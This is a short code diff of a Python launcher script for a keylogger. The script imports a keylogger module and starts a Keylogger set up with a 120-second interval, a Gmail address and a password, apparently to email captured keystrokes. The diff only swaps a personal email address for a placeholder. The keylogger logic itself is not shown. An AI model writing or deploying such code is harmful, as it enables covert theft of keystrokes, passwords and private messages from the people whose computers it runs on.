@@ -3,7 +3,7 @@
 import keylogger
 
 try:
-    logger = keylogger.Keylogger(120,"pauloclmatos@gmail.com", "emailpassword")
+    logger = keylogger.Keylogger(120,"myemail@gmail.com", "emailpassword")
     logger.start()
 except KeyboardInterrupt:
     print()
